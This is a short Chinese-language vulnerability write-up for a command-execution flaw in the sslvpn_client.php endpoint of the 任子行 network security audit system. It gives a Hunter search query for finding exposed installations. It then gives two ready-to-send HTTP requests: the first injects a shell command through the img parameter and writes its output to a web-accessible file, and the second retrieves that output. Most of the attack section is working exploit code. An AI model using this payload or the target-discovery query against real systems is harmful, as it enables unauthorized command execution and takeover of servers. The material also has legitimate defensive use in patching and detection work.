# 任子行网络安全审计系统sslvpn_client存在命令执行漏洞

# 一、漏洞简介
任子行网络安全审计系统sslvpn_client存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限。

# 二、影响版本
+ 任子行网络安全审计系统

# 三、资产测绘
+ hunter`web.title="任子行网络安全审计系统"`
+ 特征

![1701754517024-9650a99f-36cf-4d5b-bb00-72481a181d69.png](./img/NW8qdWbMZsOQJ36m/1701754517024-9650a99f-36cf-4d5b-bb00-72481a181d69-722342.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701754958503-02c63b7d-1e55-430e-bc14-1bfec57ca492.png](./img/NW8qdWbMZsOQJ36m/1701754958503-02c63b7d-1e55-430e-bc14-1bfec57ca492-076513.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701754995310-190a24ff-8343-4b7e-9499-43cb74c7d076.png](./img/NW8qdWbMZsOQJ36m/1701754995310-190a24ff-8343-4b7e-9499-43cb74c7d076-746433.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hqynfpeg5ms3gnkw>